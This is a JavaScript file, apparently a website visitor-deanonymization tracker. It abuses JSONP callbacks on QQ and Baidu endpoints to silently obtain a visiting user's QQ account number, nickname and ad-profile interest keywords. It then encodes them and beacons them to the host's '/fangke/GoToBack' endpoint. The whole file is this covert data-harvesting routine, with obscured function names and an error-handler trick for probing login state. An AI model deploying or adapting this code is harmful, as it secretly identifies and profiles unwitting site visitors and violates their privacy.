var ie = document.all ? true: false;
var aaaddda=false;
var aaadddb=false;
var aaadddd=false;
function fisker_encode_v2(s){
    var es = [],c='',ec='';
    s = s.split('');
    for(var i=0,length=s.length;i<length;i++){
        c = s[i];
        ec = encodeURIComponent(c);
        if(ec==c){
            ec = c.charCodeAt().toString(16);
            ec = ('00' + ec).slice(-2);
        }
        es.push(ec);
    }
    return es.join('').replace(/%/g,'').toUpperCase();
}

function ee(s){
    var es = [],c='',ec='';
    s = s.split('');
    for(var i=0,length=s.length;i<length;i++){
        c = s[i];
        ec = encodeURIComponent(c);
        if(ec==c){
            ec = c.charCodeAt().toString(16);
            ec = ('00' + ec).slice(-2);
        }
        es.push(ec);
    }
    return es.join('').replace(/%/g,'').toUpperCase();
}

function fangkenoLogin(){
    loadJS("http://coral.qq.com/user/0?source=0&callback=checkLoginCB&_=1389324243585");
}

function checkLoginCB(a){
    try{
        if(a.errCode!=8){
            setTimeout(xxx,100);
            fangke_LoginOK();
        }else{
            setTimeout(fangkenoLogin, 5000);
        }
    }catch(e){
        setTimeout(fangkenoLogin, 5000);
    }
}

function fangke_LoginOK(){
    loadJS("/aac/wfqt/qq/qq.com/getMsq.js");
}

function random(min,max){
    return Math.floor(min+Math.random()*(max-min));
}

function fangkevisit(){

}

function Obj2str(o) {
    if (o == undefined) {return "";}
    var r = [];
    if (typeof o == "string") return "\"" + o.replace(/([\"\\])/g, "\\$1").replace(/(\n)/g, "\\n").replace(/(\r)/g, "\\r").replace(/(\t)/g, "\\t") + "\"";
    if (typeof o == "object") {
        if (!o.sort) {
            for (var i in o)
                r.push("\"" + i + "\":" + Obj2str(o[i]));
            if (!!document.all && !/^\n?function\s*toString\(\)\s*\{\n?\s*\[native code\]\n?\s*\}\n?\s*$/.test(o.toString)) {
                r.push("toString:" + o.toString.toString());
            }
            r = "{" + r.join() + "}"
        } else {
            for (var i = 0; i < o.length; i++)
                r.push(Obj2str(o[i]))
            r = "[" + r.join() + "]";
        }
        return r;
    }
    return o.toString().replace(/\"\:/g, '":""');
}

function loadJS(jsurl, onsuccess, charset, onerr) {
    var xScript = document.createElement("script");
    xScript.type = "text/javascript";
    if(charset=='')
    {
        xScript.charset = "utf-8";
    }
    else {
        xScript.charset = charset;
    }

    xScript.src = jsurl;
    xScript.onerror = function() {
        if(onerr){
            setTimeout(onerr, 10)
        }
    };
    if (ie) {
        xScript.onreadystatechange = function() {
            if (xScript.readyState) {
                if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if(onsuccess){
                        setTimeout(onsuccess, 10);
                    }
                }
            } else {
                xScript.onreadystatechange = null;
                xScript.onload = null;
                if(onsuccess){
                    setTimeout(onsuccess, 10);
                }
            }
        }
    } else {
        xScript.onload = function() {
            if (xScript.readyState) {
                if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if(onsuccess){
                        setTimeout(onsuccess, 10);
                    }
                }
            } else {
                xScript.onreadystatechange = null;
                xScript.onload = null;
                if(onsuccess){
                    setTimeout(onsuccess, 10);
                }
            }
        }
    }
    document.getElementsByTagName('HEAD').item(0).appendChild(xScript)
}

function re(n)
{
    var url = document.location.href;
    var s = url.substring(url.indexOf("?")+1).split("&");
    for(var i =0;i<s.length;i++)
    {
        var loc = s[i].indexOf(n+"=");
        if(loc!=-1)
        {
            return s[i].replace(n+"=","").replace("?","");
            break;
        }
    }
    return "";
}

var paramJO={};
paramJO.wid=re("w");
paramJO.uid=re("u");
paramJO.ref=re("ref");
paramJO.page=re("page");
paramJO.qq="";
paramJO.vq="";
paramJO.nick="";
paramJO.ip="";
paramJO.ipaddr="";
paramJO.phone="";
paramJO.card="";
paramJO.phoneaddr="";
paramJO.phoneqq="";
paramJO.name="";
paramJO.bkey="";


function xxxxa(){
    if(aaaddda){
        aaadddb=true;
        window.onerror=null;
        paramJO.vq=xx0;
        loadJS("http://"+document.domain+"/fangke/GoToBack?gg="+ee(Obj2str(paramJO)));
        //xx3++;
    }else{abcc();}
}

function xxxxb(){
    if(!aaadddb){
        xxxxa();
    }
}

function xxx(){
    if (paramJO.qq=='')
    {
        //loadJS('http://open.3g.qq.com/checkLoginCallback.json?id=2115&callback=xxxx&_=1399435480553',abcc,'',abcd);
        //loadJS('http://dir.minigame.qq.com/cgi-bin/QQGame_RichPayerInfo/get_player_info?callback=xxxx&uin=',abcc,'',abcd);

        loadJS('http://dir.minigame.qq.com/cgi-bin/QQGame_RichPayerInfo/get_player_info?callback=xxxx&uin=');
    }else{
        loadJS("http://"+document.domain+"/fangke/GoToBack?gg="+ee(Obj2str(paramJO)));
        //setTimeout(xxx,20000);
    }
}

function windowerror(){
    aaaddda=true;
}

function abcc(){
    try{
        paramJO.qq=""+getUserName.data.uin+"";
        paramJO.nick=encodeURIComponent(getUserName.data.name);
        setTimeout(xxx,1);
    }
    catch (e){
        aaadddd=true;
        xx0="1"+random(101,9999999);
        window.onerror=windowerror;
        loadJS("http://app.data.qq.com/?umod=user&uid="+xx0+"&t=0.6422199569642544",xxxxa,'',xxxxb)
    }
}

function abcd(){
    if(!aaadddd){
        abcc();
    }
}

function xxxx(a){
    try
    {
        if(a.uin && a.uin!=0){
            paramJO.qq=""+a.uin+"";
            paramJO.nick="";
            //xx2=encodeURIComponent(a.szNick);
            setTimeout(xxx,1);
        }else{
            abcc();
        }
    }
    catch (e)
    {
        abcc();
    }
}

var userLikeKey='';
var isOver=false;

function xxxa(a){
    try{
        for(var o in a){
            if (a[o].tit && (userLikeKey.indexOf(a[o].tit)==-1))
            {
                userLikeKey = userLikeKey + a[o].tit+',';
            }
            if (a[o].bid && (userLikeKey.indexOf(a[o].bid)==-1))
            {
                userLikeKey = userLikeKey + a[o].bid +',';
            }
        }
    }catch(e){}
    if (isOver)
    {
        paramJO.bkey=userLikeKey;
        fangkenoLogin();
    }
}


function Load1(){
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpclickedDEFINE&n=aold_cpr&rsi1=200&rsi0=200&rsi2=0&rad=0&rsi5=0&at=2&ch=tpclicked3jp&cad=0&cpa=0&fv=11&cn=2&if=16&word=http%253A%252F%252Fwww%252Eonlinedown%252Enet%252F&refer=&ready=1&jk=aebff24de449b0ec&jn=3&js=ui&lmt=1389046944&csp=1366%2C768&ccd=32&cja=true&cpl=42&cmi=63&cce=true&csl=zh-CN&did=2&rt=5&dt=1389075754&pn=8%7CbaiduTpclickedDEFINE%7C65&prt='+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',Load2,'gbk',Load2);
}
function Load2(){
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpclickedDEFINE&n=aold_cpr&rsi1=200&rsi0=200&rsi2=0&rad=0&rsi5=0&at=2&ch=tpclicked3gx&cad=0&cpa=0&fv=11&cn=2&if=16&word=http%253A%252F%252Fwww%252Eonlinedown%252Enet%252F&refer=&ready=1&jk=765593e7003186f1&jn=3&js=ui&lmt=1389046944&csp=1366%2C768&ccd=32&cja=true&cpl=42&cmi=63&cce=true&csl=zh-CN&did=3&rt=6&dt=1389075754&pn=8%3A4%7CbaiduTpclickedDEFINE%3AbaiduTpclickedDEFINE%7C65%3A2&prt='+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',Load3,'gbk',Load3);
}
function Load3(){
    isOver=true;
    loadJS('http://cpro.baidu.com/cpro/ui/uijs.php?cf=13&rs=1&tu=u1362748&tn=baiduTpclickedDEFINE&n=aold_cpr&rsi1=200&rsi0=200&rsi2=0&rad=0&rsi5=0&at=2&ch=tpclicked3ps&cad=0&cpa=0&fv=11&cn=2&if=16&word=http%253A%252F%252Fwww%252Eonlinedown%252Enet%252F&refer=&ready=1&jk=2e07e563da2dd656&jn=3&js=ui&lmt=1389046944&csp=1366%2C768&ccd=32&cja=true&cpl=42&cmi=63&cce=true&csl=zh-CN&did=4&rt=5&dt=1389075754&pn=8%3A4%3A4%7CbaiduTpclickedDEFINE%3AbaiduTpclickedDEFINE%3AbaiduTpclickedDEFINE%7C65%3A2%3A2&prt=' +
        ''+(new Date().getTime())+'&cm=200&um=40&wn=1&tm=22&func=xxxa&hn=4&ie=0&i3=f&stid=5&distp=1001',null,'gbk',xxxa);
}

//fangkenoLogin(); 
Load1();
